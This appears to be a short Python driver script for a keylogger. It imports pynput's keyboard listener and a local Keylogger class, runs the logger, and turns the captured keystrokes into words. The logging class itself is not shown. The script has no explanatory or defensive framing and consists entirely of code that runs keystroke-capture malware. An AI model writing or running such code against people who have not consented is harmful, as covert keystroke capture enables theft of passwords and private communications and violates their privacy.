from pynput.keyboard import Key, Listener
from keylogger import Keylogger

keylogger = Keylogger()
keylogger.run_keylogger()
new_words = keylogger.as_words()
